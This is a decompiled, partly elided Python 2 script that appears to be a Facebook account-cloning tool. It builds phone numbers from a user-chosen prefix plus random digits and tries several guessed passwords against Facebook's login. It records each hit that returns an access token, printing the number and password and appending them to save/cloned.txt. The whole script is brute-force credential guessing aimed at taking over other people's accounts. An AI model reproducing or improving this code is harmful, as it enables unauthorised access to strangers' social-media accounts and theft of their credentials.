...
# Decompiled at   : Fri Oct  9 11:41:35 2020
# ------------------------------------------
...
for n in range(10000):
    ...
    nmbr = random.randint(1111113, 9999113)
...
while (loop == 'true'):
    ...
    if (passcode == CorrectPasscode):
            ...
            os.system('xdg-open FB.com/Kudiyan.Da.Prince')
...
def login():
    os.system('clear')
    print logo1
    print "\033[1;93m[1]\x1b[1;94m Start Cloning (No Login)"
    time.sleep(0.05)
    print '\x1b[1;93m[0]\033[1;94m Exit (SeeYou Soon)'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95m Choose : \033[1;95m")
    if peak =="":
...
def action():
    ...
    if peak =='':
        ...
        os.system("clear")
        print logo2
        print " Enter Mobile Number Code (01 to 50)"+'\n'
        print '      For Example... 01,11,22,33,44'
        try:
            c = raw_input("\033[1;96 Choose : ")
            k="03"
            idlist = ('.txt')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;93m(Zee)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Zee)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Zee)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Zee)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Zee)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
